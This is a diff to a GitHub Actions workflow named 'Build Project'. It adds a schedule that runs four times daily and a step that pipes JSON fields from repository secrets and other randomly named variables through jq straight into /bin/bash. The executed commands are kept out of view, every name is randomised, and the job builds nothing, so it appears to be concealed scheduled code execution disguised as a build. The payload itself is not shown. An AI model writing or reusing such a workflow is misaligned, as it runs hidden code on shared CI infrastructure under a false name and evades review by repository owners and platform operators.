@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '30 5,11,17,23 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,16 +14,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          ujhvk0: ${{ secrets.ujhvk0 }}
+          bv20: ${{ secrets.bv20 }}
         run: |
-          printf '%s' "$ujhvk0" | jq -r .yy015 | /bin/bash
-          echo $spolx70 | jq -r .rcox8 | /bin/bash
-          printf '%s' "$hboo82519" | jq -r .tvuav531 | /bin/bash
-          echo $bgd9 | jq -r .r344 | /bin/bash
+          printf '%s' "$bv20" | jq -r .cq625 | /bin/bash
+          echo $f96 | jq -r .zzh99502 | /bin/bash
+          printf '%s' "$wn6922" | jq -r .nidl23694 | /bin/bash
+          echo $sp60 | jq -r .inecz1 | /bin/bash
+          echo $d707 | jq -r .bqdwk09624 | /bin/bash
+          printf '%s' "$evbyx7067" | jq -r .syic131 | /bin/bash
+          printf '%s' "$evqv22036" | jq -r .ewg3 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: 8EQPcSn2
+          name: iQg6YeTF
           path: "*.zip"
           retention-days: 1
